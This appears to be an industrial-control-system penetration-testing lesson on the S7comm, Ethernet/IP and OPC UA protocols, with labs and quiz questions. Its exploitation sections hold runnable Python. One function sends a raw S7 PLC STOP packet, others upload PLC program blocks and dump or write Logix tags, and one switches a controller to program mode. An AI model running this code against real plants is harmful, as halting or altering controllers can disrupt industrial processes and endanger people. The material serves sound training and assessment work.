Lesson 03: Advanced Protocol
Analysis

Lesson 03: Advanced Protocol Analysis S7comm, Ethernet/IP, OPC UA
Learning Objectives
●​
●​
●​
●​
●​

Reverse engineer Siemens S7comm and S7comm-Plus protocols
Understand CIP (Common Industrial Protocol) and Ethernet/IP architecture
Analyze OPC UA security mechanisms and certificate infrastructure
Exploit proprietary protocol vulnerabilities
Build custom protocol clients for advanced ICS penetration testing

1. Siemens S7comm Protocol
1.1 S7comm Overview
Background:
●​
●​
●​
●​

Proprietary protocol for Siemens S7 PLC family (S7-300, S7-400, S7-1200, S7-1500)
Based on ISO-over-TCP (RFC 1006) / TPKT / ISO-COTP
Reverse-engineered by security researchers (no official public specification)
Used by TIA Portal, Step 7, WinCC for PLC programming and SCADA
communication

Default Port: 102/TCP
Network Stack:
[S7comm]
↓
[COTP - ISO 8073]
↓
[TPKT - RFC 1006]
↓
[TCP - Port 102]

1.2 TPKT/COTP Layers
TPKT (ISO-on-TCP) Header:
+--------+--------+--------+--------+
| Version|Reserved| Length (2 bytes)|
| 0x03 | 0x00 | Total Length |
+--------+--------+--------+--------+

COTP Connection Request (CR):
Length: 1 byte
PDU Type: 0xE0 (CR), 0xD0 (CC - Connection Confirm), 0xF0 (DT - Data Transfer)
Dest Reference: 2 bytes
Source Reference: 2 bytes
Class/Option: 1 byte
Parameters: Variable
Example COTP Connection:
Client → Server (CR):
03 00 00 16 - TPKT header (length 22 bytes)
11 E0 00 00 - COTP CR, dest ref 0x0000
00 01 00 C1 - src ref 0x0001, class 0
02 01 00
- TPKT size 1024
C2 02 01 00 - COTP size 1024
Server → Client (CC):
03 00 00 16
11 D0 00 01 - COTP CC, assigned dest ref 0x0001
00 00 00 C1 - src ref 0x0000
02 01 00
C2 02 01 00

1.3 S7comm PDU Structure
S7comm Header:
+---------------+---------------+---------------+
| Protocol ID | ROST
| Red ID
|
| 0x32
| (Message Type)| (redundancy) |
+---------------+---------------+---------------+
| PDU Ref
| Param Length | Data Length |
| (2 bytes) | (2 bytes) | (2 bytes) |
+---------------+---------------+---------------+
| [Error Class/Code if applicable - 2 bytes] |
+---------------+---------------+---------------+
| [Parameters - variable]
|
+---------------+---------------+---------------+
| [Data - variable]
|
+---------------+---------------+---------------+
ROST (Message Type):
●​
●​
●​
●​

0x01: Job Request (client → server)
0x02: Ack (acknowledgement)
0x03: Ack Data (response with data)
0x07: Userdata (extended functions)

1.4 S7comm Function Codes
Parameter Header:
Function: 1 byte
Item Count: 1 byte
[Items - variable]
Common Functions:
●​
●​
●​
●​
●​
●​
●​
●​
●​
●​
●​

0x04: Read Var
0x05: Write Var
0xF0: Setup Communication
0x28: PLC Control (start/stop)
0x29: PLC Stop
0x1A: Request Download (program upload/download)
0x1B: Download Block
0x1C: Download Ended
0x1D: Start Upload
0x1E: Upload
0x1F: End Upload

1.5 S7comm Addressing Modes
Item Specification:
Specification Type: 0x12 (variable specification)
Length of following address: 1 byte
Syntax ID:
0x10: S7ANY
0x13: Symbolic Address
0xB0: DB Read
Transport Size:
0x01: BIT
0x02: BYTE
0x03: CHAR
0x04: WORD
0x05: INT
0x06: DWORD
0x07: DINT
0x08: REAL
Length: 2 bytes (number of elements)
DB Number: 2 bytes
Area:
0x81: Process Input (I)
0x82: Process Output (Q)

0x83: Marker (M)
0x84: Data Block (DB)
0x85: Instance DB
0x86: Local (L)
0x1C: Counter (C)
0x1D: Timer (T)
Address: 3 bytes (bit-addressed: byte*8 + bit)
Example - Read DB1.DBW0 (Data Block 1, Word 0):
12 0A 10 02 - Var spec, length 10, S7ANY, 2 elements
00 01 00 01 - BYTE transport, count 1, DB 1
84 00 00 00 - Area DB, address 0.0

1.6 S7comm Exploitation Techniques
PLC Start/Stop (Function 0x28/0x29):
import socket
import struct
def s7_stop_plc(target_ip):
"""
Sends PLC STOP command to Siemens S7 PLC
WARNING: Causes immediate process shutdown
"""
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 102))
# COTP Connection Request
cotp_cr = bytes.fromhex('0300001611e0000000010000c00100c10200c20200')
sock.send(cotp_cr)
sock.recv(1024) # Receive COTP CC
# S7comm Setup Communication
s7_setup = bytes.fromhex('0300001902f08032010000000000080000f0000001000100f0')
sock.send(s7_setup)
sock.recv(1024)
# S7comm PLC STOP (Function 0x29)
s7_stop =
bytes.fromhex('0300002102f080320700000000000800080001120411440100ff09005f5045')
sock.send(s7_stop)
response = sock.recv(1024)
sock.close()
return response

# Usage: s7_stop_plc('192.168.1.100')
Memory Enumeration:
def s7_read_area(target_ip, area, db_number, start, count):
"""
Read arbitrary memory area from S7 PLC
area: 0x84 (DB), 0x81 (I), 0x82 (Q), 0x83 (M)
"""
# Implementation using python-snap7 library
import snap7
from snap7.util import *
plc = snap7.client.Client()
plc.connect(target_ip, 0, 1) # IP, rack, slot
if area == 0x84: # DB
data = plc.db_read(db_number, start, count)
elif area == 0x81: # Input
data = plc.read_area(snap7.types.Areas.PE, 0, start, count)
elif area == 0x82: # Output
data = plc.read_area(snap7.types.Areas.PA, 0, start, count)
elif area == 0x83: # Marker
data = plc.read_area(snap7.types.Areas.MK, 0, start, count)
plc.disconnect()
return data
# Example: Read DB1, starting at byte 0, read 100 bytes
data = s7_read_area('192.168.1.100', 0x84, 1, 0, 100)
Program Upload (steal PLC logic):
def s7_upload_program(target_ip, block_type, block_num):
"""
Upload program block from PLC
block_type: 'OB' (Organization Block), 'FC' (Function), 'FB' (Function Block), 'DB' (Data
Block)
"""
import snap7
plc = snap7.client.Client()
plc.connect(target_ip, 0, 1)
# Get block info
block_info = plc.get_block_info(block_type, block_num)

# Upload block
block_data = plc.upload(block_type, block_num)
plc.disconnect()
# Save to file
filename = f"{block_type}{block_num}.mc7"
with open(filename, 'wb') as f:
f.write(block_data)
return block_data
# Usage: s7_upload_program('192.168.1.100', 'OB', 1)

1.7 S7comm-Plus (Next Generation)
Background:
●​
●​
●​
●​

Introduced with S7-1200/1500 PLCs (2010+)
Encrypted and integrity-protected (initially)
Reverse-engineered by security researchers (Steffen Robertz, Cheng Lei)
Integrity protection can be bypassed

Key Differences from S7comm:
●​
●​
●​
●​

Message Authentication: HMAC-SHA256 (key derivation vulnerable)
Replay Protection: Sequence numbers (can be manipulated)
Obfuscation: Proprietary encoding schemes
Session Keys: Derived from hardcoded secrets (extracted from firmware)

Vulnerabilities:
●​ CVE-2019-13945: Authentication bypass via TLS certificate validation flaw
●​ Session Hijacking: Sequence number prediction
●​ Protocol Downgrade: Force fallback to S7comm on older PLCs
Research Tools:
●​ s7comm-plus Wireshark dissector:
https://github.com/gymgit/s7comm-plus-wireshark
●​ Snap7 S7-1200 support: Limited S7comm-plus functionality

2. Ethernet/IP and CIP Protocol
2.1 CIP (Common Industrial Protocol)
Background:

●​ Developed by ODVA (Open DeviceNet Vendors Association)
●​ Application layer protocol used by multiple transport layers:
○​ DeviceNet: CAN-based (obsolete)
○​ ControlNet: Deterministic token-passing
○​ Ethernet/IP: CIP over standard Ethernet/TCP/UDP
○​ CompoNet: Fieldbus variant
Object-Oriented Model:
●​
●​
●​
●​

Classes: Device types (e.g., Analog Input, Motor Control)
Instances: Specific devices
Attributes: Device properties
Services: Operations (Get/Set Attribute, Reset, etc.)

2.2 Ethernet/IP Protocol Stack
Network Stack:
[CIP]
↓
[Ethernet/IP Encapsulation]
↓
[TCP Port 44818 | UDP Port 2222]
↓
[Ethernet]
Ports:
●​ 44818/TCP: Explicit messaging (encapsulation)
●​ 2222/UDP: Implicit messaging (I/O data)

2.3 Ethernet/IP Encapsulation Layer
Encapsulation Header:
+---------------+---------------+
| Command
| Length
|
| (2 bytes) | (2 bytes) |
+---------------+---------------+
| Session Handle (4 bytes)
|
+---------------+---------------+
| Status
| Sender Context|
| (4 bytes) | (8 bytes) |
+---------------+---------------+
| Options
|
| (4 bytes) |
+---------------+
[Encapsulated Data]

Commands:
●​
●​
●​
●​
●​
●​

0x0065: RegisterSession
0x0066: UnregisterSession
0x006F: SendRRData (Request/Response Data)
0x0070: SendUnitData (Connected Data)
0x0063: ListServices
0x0064: ListIdentity

2.4 CIP Message Structure
CIP Request:
Service Code: 1 byte (e.g., 0x01 = Get Attributes All)
Request Path Size: 1 byte (in words)
Request Path: variable (EPATH - Electronic Path)
[Service-specific Data]
EPATH (Electronic Path):
●​ Logical Segment: Class/Instance/Attribute/Connection Point
●​ Port Segment: Network addressing
●​ Data Segment: Extended addressing
Example - Get Attribute All for Identity Object:
Service: 0x01 (Get Attributes All)
Path Size: 0x02 (2 words = 4 bytes)
Path: 20 01 24 01
- 0x20: Logical, Class ID (8-bit)
- 0x01: Class 1 (Identity)
- 0x24: Logical, Instance ID (8-bit)
- 0x01: Instance 1

2.5 CIP Common Services
Code

Service

Description

0x01

Get Attributes All

Read all attributes of object

0x0E

Get Attribute Single

Read single attribute

0x10

Set Attribute Single

Write single attribute

0x05

Reset

Reset device/object

0x4B

Execute PCCC

Legacy Allen-Bradley protocol encapsulation

0x52

Read Tag

Read tag-based data (Logix controllers)

0x53

Write Tag

Write tag-based data

0x4C

CIP Generic

Generic CIP request

2.6 Identity Object (Class 0x01)
Purpose: Device identification and status
Attributes:
●​
●​
●​
●​
●​
●​
●​

Attr 1: Vendor ID (Allen-Bradley = 0x0001)
Attr 2: Device Type (e.g., 0x0E = Communications Adapter)
Attr 3: Product Code
Attr 4: Revision (Major.Minor)
Attr 5: Status Word
Attr 6: Serial Number
Attr 7: Product Name (string)

Enumeration Example:
from pycomm3 import LogixDriver
def enumerate_ethernet_ip(target_ip):
"""
Enumerate Ethernet/IP device using CIP Identity Object
"""
with LogixDriver(target_ip) as plc:
# Get Identity
identity = plc.get_plc_info()
print(f"Vendor: {identity['vendor']}")
print(f"Product Type: {identity['product_type']}")
print(f"Product Code: {identity['product_code']}")
print(f"Revision: {identity['revision']}")
print(f"Serial: {identity['serial']}")
print(f"Product Name: {identity['product_name']}")
# List tags (ControlLogix/CompactLogix)
tags = plc.get_tag_list()
for tag in tags:
print(f"Tag: {tag['tag_name']}, Type: {tag['data_type']}")
# Usage: enumerate_ethernet_ip('192.168.1.100')

2.7 Rockwell Tag-Based Addressing

ControlLogix/CompactLogix use tag names instead of memory addresses:
Example Tags:
●​ Temperature_Sensor_01: Analog input
●​ Conveyor_Speed: DINT variable
●​ Pump_Running: BOOL bit
Read Tag Service (0x4C - CIP Data Table Read):
from pycomm3 import LogixDriver
with LogixDriver('192.168.1.100') as plc:
# Read single tag
value = plc.read('Temperature_Sensor_01')
print(f"Temperature: {value.value}")
# Write tag
plc.write('Conveyor_Speed', 1500)
# Read multiple tags
tags = plc.read('Temperature_Sensor_01', 'Pump_Running', 'Conveyor_Speed')
for tag in tags:
print(f"{tag.tag}: {tag.value}")

2.8 Ethernet/IP Exploitation
Unauthorized Tag Read:
def dump_all_tags(target_ip):
"""
Dump all tag values from Logix controller
"""
from pycomm3 import LogixDriver
with LogixDriver(target_ip) as plc:
tags = plc.get_tag_list()
results = {}
for tag in tags:
try:
value = plc.read(tag['tag_name'])
results[tag['tag_name']] = value.value
except Exception as e:
results[tag['tag_name']] = f"Error: {e}"
return results

# Usage: data = dump_all_tags('192.168.1.100')
Controller Mode Change (Run → Program mode):
def set_controller_mode(target_ip, mode):
"""
Change controller mode
mode: 'run', 'program'
WARNING: Stops industrial process
"""
from pycomm3 import LogixDriver
with LogixDriver(target_ip) as plc:
if mode == 'program':
# Setting to program mode stops PLC execution
result = plc.set_plc_mode('program')
elif mode == 'run':
result = plc.set_plc_mode('run')
return result
Device Reset (DoS):
def reset_device(target_ip):
"""
Send CIP Reset service (DoS attack)
"""
# Low-level CIP implementation required
# Service 0x05 (Reset) to Identity Object
pass

2.9 Ethernet/IP Vulnerabilities
●​
●​
●​
●​
●​

CVE-2012-6437: Rockwell denial-of-service via malformed CIP packets
No Authentication: Protocol assumes trusted network
Tag Enumeration: Full process variable disclosure
Firmware Upload: Some devices allow firmware download over EIP
PCCC Encapsulation (0x4B): Legacy protocol with additional vulnerabilities

3. OPC UA (Unified Architecture)
3.1 OPC UA Overview
Background:
●​ Modern replacement for OPC Classic (OPC DA/HDA/AE)
●​ Platform-independent (Windows, Linux, embedded)
●​ Built-in security: encryption, authentication, authorization

●​ Service-oriented architecture (SOA)
Default Port: 4840/TCP (opc.tcp://)
Transport Protocols:
●​ OPC UA Binary: Efficient binary encoding over TCP
●​ OPC UA HTTPS: JSON/XML over HTTPS (less common)

3.2 OPC UA Security Modes
Security Modes:
1.​ None: No encryption, no authentication (insecure, testing only)
2.​ Sign: Message signing (integrity), no encryption
3.​ SignAndEncrypt: Full security
Security Policies:
●​
●​
●​
●​
●​
●​

None: No security
Basic128Rsa15: RSA 1024-bit + AES-128-CBC (deprecated)
Basic256: RSA 2048-bit + AES-256-CBC (deprecated)
Basic256Sha256: RSA 2048-bit + AES-256-CBC + SHA256 (recommended)
Aes128_Sha256_RsaOaep: Modern, strong cryptography
Aes256_Sha256_RsaPss: Strongest

3.3 OPC UA Authentication Mechanisms
User Token Types:
1.​ Anonymous: No credentials (if server allows)
2.​ Username/Password: Plaintext or encrypted
3.​ X.509 Certificate: Mutual TLS authentication
4.​ Issued Token: Kerberos, SAML, OAuth tokens (rare in OT)

3.4 OPC UA Address Space
Node Classes:
●​
●​
●​
●​
●​
●​
●​
●​

Object: Represents physical or logical entities
Variable: Data values (readable/writable)
Method: Callable functions
ObjectType: Templates for objects
VariableType: Templates for variables
ReferenceType: Relationships between nodes
DataType: Data type definitions
View: Organized subset of address space

Node Attributes:

●​ NodeId: Unique identifier (namespace​
)
●​ BrowseName: Human-readable name
●​ DisplayName: Localized name
●​ Description: Documentation
●​ Value: Data (for Variable nodes)
●​ AccessLevel: Read/write permissions
Example NodeIds:
●​ ns=0;i=85: Root > Objects
●​ ns=2;s="Temperature": Namespace 2, string identifier "Temperature"
●​ ns=3;i=1001: Namespace 3, numeric identifier 1001

3.5 OPC UA Services
Discovery Services:
●​ FindServers: Discover OPC UA servers on network
●​ GetEndpoints: List server endpoints and security configurations
Session Services:
●​ CreateSession: Establish session
●​ ActivateSession: Authenticate user
●​ CloseSession: Terminate session
Attribute Services:
●​ Read: Read node attributes
●​ Write: Write node attributes
●​ HistoryRead: Read historical data
View Services:
●​ Browse: Navigate address space
●​ BrowseNext: Continue browsing
●​ TranslateBrowsePathsToNodeIds: Resolve paths
Method Services:
●​ Call: Invoke server-side methods
Subscription Services (Publish/Subscribe):
●​ CreateMonitoredItems: Subscribe to value changes
●​ Publish: Receive notifications

3.6 OPC UA Enumeration

Python OPC UA Client (using opcua-asyncio):
import asyncio
from asyncua import Client
async def enumerate_opcua_server(endpoint_url):
"""
Enumerate OPC UA server nodes and variables
"""
client = Client(endpoint_url)
try:
await client.connect()
print(f"[+] Connected to {endpoint_url}")
# Get server information
server_node = client.get_node("i=2253") # Server object
server_array = await client.get_node("i=2254").read_value() # Server array
print(f"Servers: {server_array}")
# Browse root objects
root = client.get_root_node()
objects = await root.get_child(["0:Objects"])
# Recursively browse
await browse_node(objects, depth=0, max_depth=3)
await client.disconnect()
except Exception as e:
print(f"[-] Error: {e}")
async def browse_node(node, depth=0, max_depth=5):
"""
Recursively browse OPC UA node tree
"""
if depth > max_depth:
return
try:
children = await node.get_children()
for child in children:
browse_name = await child.read_browse_name()
node_class = await child.read_node_class()
print(" " * depth + f"[{node_class.name}] {browse_name.Name}")
# If it's a variable, read its value

if node_class.value == 2: # Variable
try:
value = await child.read_value()
print(" " * depth + f" → Value: {value}")
except:
pass
# Recurse for objects
if node_class.value in [1, 2]: # Object or Variable
await browse_node(child, depth + 1, max_depth)
except Exception as e:
pass
# Usage
asyncio.run(enumerate_opcua_server("opc.tcp://192.168.1.100:4840"))
Endpoint Discovery:
from asyncua import Client
async def discover_endpoints(server_url):
"""
Discover OPC UA server endpoints and security configurations
"""
client = Client(server_url)
endpoints = await client.connect_and_get_server_endpoints()
for ep in endpoints:
print(f"\nEndpoint URL: {ep.EndpointUrl}")
print(f"Security Mode: {ep.SecurityMode}")
print(f"Security Policy: {ep.SecurityPolicyUri}")
print(f"User Token Types:")
for token in ep.UserIdentityTokens:
print(f" - {token.TokenType}: {token.PolicyId}")
# Usage
asyncio.run(discover_endpoints("opc.tcp://192.168.1.100:4840"))

3.7 OPC UA Exploitation
Anonymous Access Test:
async def test_anonymous_access(endpoint_url):
"""
Test if server allows anonymous access
"""

client = Client(endpoint_url)
# Try security mode None
client.set_security_string("None")
try:
await client.connect()
print("[+] Anonymous access allowed!")
# Try reading sensitive data
root = client.get_root_node()
objects = await root.get_child(["0:Objects"])
await browse_node(objects)
await client.disconnect()
return True
except Exception as e:
print(f"[-] Anonymous access denied: {e}")
return False
Weak Security Policy Exploitation:
async def test_weak_security(endpoint_url):
"""
Test for deprecated/weak security policies
"""
client = Client(endpoint_url)
weak_policies = [
"None",
"Basic128Rsa15", # Deprecated
"Basic256"
# Deprecated
]
for policy in weak_policies:
try:
client.set_security_string(policy)
await client.connect()
print(f"[!] Server accepts weak policy: {policy}")
await client.disconnect()
except:
print(f"[-] Policy {policy} rejected")
Certificate Validation Bypass:
from asyncua import Client
from asyncua.crypto.cert_gen import setup_self_signed_certificate

async def bypass_certificate_validation(endpoint_url):
"""
Generate self-signed certificate and attempt connection
Tests if server validates certificates properly
"""
# Generate self-signed cert
await setup_self_signed_certificate("attacker_cert.der",
"attacker_key.pem",
"Attacker",
"urn:attacker")
client = Client(endpoint_url)
client.set_security_string("SignAndEncrypt,Basic256Sha256,attacker_cert.der,attacker_key.
pem")
try:
await client.connect()
print("[!] Server accepted self-signed certificate without validation!")
await client.disconnect()
except Exception as e:
print(f"[-] Certificate rejected: {e}")

3.8 OPC UA Vulnerabilities
Historical CVEs:
●​
●​
●​
●​

CVE-2017-12069: Stack buffer overflow in OPC UA implementations
CVE-2019-6575: Matrikon OPC UA Tunneller authentication bypass
CVE-2021-27432: Prosys OPC UA Java SDK DoS
CVE-2022-29862: Multiple OPC UA stack vulnerabilities

Common Misconfigurations:
●​
●​
●​
●​
●​

Anonymous access enabled in production
Weak security policies (Basic128Rsa15)
Certificate validation disabled
Default credentials in user database
Overly permissive access control

4. Wireshark Analysis
4.1 S7comm Wireshark Filters
s7comm
# All S7comm traffic
s7comm.header.rosctr == 1
# Job requests
s7comm.param.func == 0x04
# Read Var

s7comm.param.func == 0x05
# Write Var
s7comm.param.func == 0x28
# PLC Control
s7comm.param.func == 0x29
# PLC Stop
iso.tpdu_code == 0xe0
# COTP Connection Requests

4.2 Ethernet/IP Wireshark Filters
enip
# All Ethernet/IP traffic
enip.command == 0x6f
# SendRRData
cip.service == 0x01
# Get Attributes All
cip.service == 0x52
# Read Tag Service
cip.service == 0x53
# Write Tag Service
cip.class == 0x01
# Identity Object

4.3 OPC UA Wireshark Filters
opcua
# All OPC UA traffic
opcua.ServiceId == 631
# CreateSessionRequest
opcua.ServiceId == 465
# ActivateSessionRequest
opcua.ServiceId == 631
# ReadRequest
opcua.ServiceId == 673
# WriteRequest
opcua.ServiceId == 527
# BrowseRequest
opcua.transport.shn == "OPC" # OPC UA Secure Conversation

5. Hands-On Lab Exercises
Lab 1: S7comm Analysis
1.​ Download S7comm PCAP from
https://github.com/gymgit/s7commwireshark/tree/master/sample-captures
2.​ Identify:
○​ COTP connection establishment
○​ S7comm Setup Communication
○​ Read/Write operations and target addresses
○​ PLC control commands

Lab 2: Build S7 Reconnaissance Tool
1.​ Install python-snap7: pip install python-snap7
2.​ Install Snap7 library: https://snap7.sourceforge.net/
3.​ Create script to:
○​ Enumerate S7 PLCs on network (port 102 scan)
○​ Read CPU info (order code, firmware version)
○​ List available blocks (OB, FC, FB, DB)
○​ Map DB address space

Lab 3: Ethernet/IP Enumeration

1.​ Set up OpenPLC with Ethernet/IP support (or use FactoryIO + Logix simulator)
2.​ Install pycomm3: pip install pycomm3
3.​ Develop scanner to:
○​ Discover Ethernet/IP devices (broadcast ListIdentity)
○​ Read Identity Object
○​ Enumerate tags (if Logix controller)
○​ Read all tag values

Lab 4: OPC UA Security Assessment
1.​ Install opcua-asyncio: pip install asyncua
2.​ Deploy OPC UA server (https://github.com/FreeOpcUa/python-opcua)
3.​ Perform security assessment:
○​ Enumerate endpoints and security policies
○​ Test anonymous access
○​ Identify weak/deprecated policies
○​ Attempt self-signed certificate
○​ Browse full address space

6. Tools & Resources
S7comm Tools
●​
●​
●​
●​

python-snap7: https://github.com/gijzelaerr/python-snap7
Snap7: https://snap7.sourceforge.net/
plcscan: https://github.com/meeas/plcscan
s7-pcaps: https://github.com/gymgit/s7commwireshark

Ethernet/IP Tools
●​ pycomm3: https://github.com/ottowayi/pycomm3
●​ cpppo: https://github.com/pjkundert/cpppo (EtherNet/IP simulator)
●​ EtherNet/IP Wireshark dissector: Built-in

OPC UA Tools
●​ opcua-asyncio: https://github.com/FreeOpcUa/opcua-asyncio
●​ UAExpert:
https://www.unified-automation.com/products/development-tools/uaexpert.html
●​ OPC UA .NET SDK: https://github.com/OPCFoundation/UA-.NETStandard
●​ node-opcua: https://github.com/node-opcua/node-opcua

Learning Resources
●​ S7comm Wireshark Dissector: https://github.com/gymgit/s7comm-wireshark
●​ OPC UA Specification:
https://opcfoundation.org/developer-tools/specifications-unified-architecture

●​ ODVA CIP Specification:
https://www.odva.org/technology-standards/key-technologies/common-industrial-prot
ocol-cip/

7. Knowledge Check
1.​ What transport protocols does S7comm use (layers below S7comm)?
2.​ How do you identify S7comm vs S7comm-Plus in Wireshark?
3.​ What is the security difference between S7comm and OPC UA?
4.​ Describe the CIP object-oriented model (classes, instances, attributes).
5.​ What are the default ports for S7comm, Ethernet/IP, and OPC UA?
6.​ How does tag-based addressing differ from memory-based addressing?
7.​ What is the purpose of OPC UA Security Policies?
8.​ Explain the SELECT-BEFORE-OPERATE equivalent in Ethernet/IP.
9.​ Why is anonymous access in OPC UA a security risk in OT networks?
10.​What reconnaissance information can you extract from the CIP Identity Object?

